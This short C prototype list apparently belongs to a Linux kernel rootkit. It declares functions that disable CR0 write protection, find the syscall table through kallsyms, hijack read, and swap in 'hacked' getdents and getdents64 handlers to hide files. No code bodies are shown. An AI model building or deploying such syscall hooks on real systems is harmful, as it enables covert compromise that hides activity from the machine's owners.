void cr0_write(unsigned long val);

int new_read(struct pt_regs *regs);

unsigned long unprotect_memory(void);

void protect_memory(unsigned long val);

void get_kallsyms_funcptr(void);

void get_syscall_table(void);

void hijack_read(void);


static long hacked_getdents64(const struct pt_regs *pt_regs);
static long hacked_getdents(const struct pt_regs *pt_regs);
void replace_getdents(void);
void clear_getdents(void);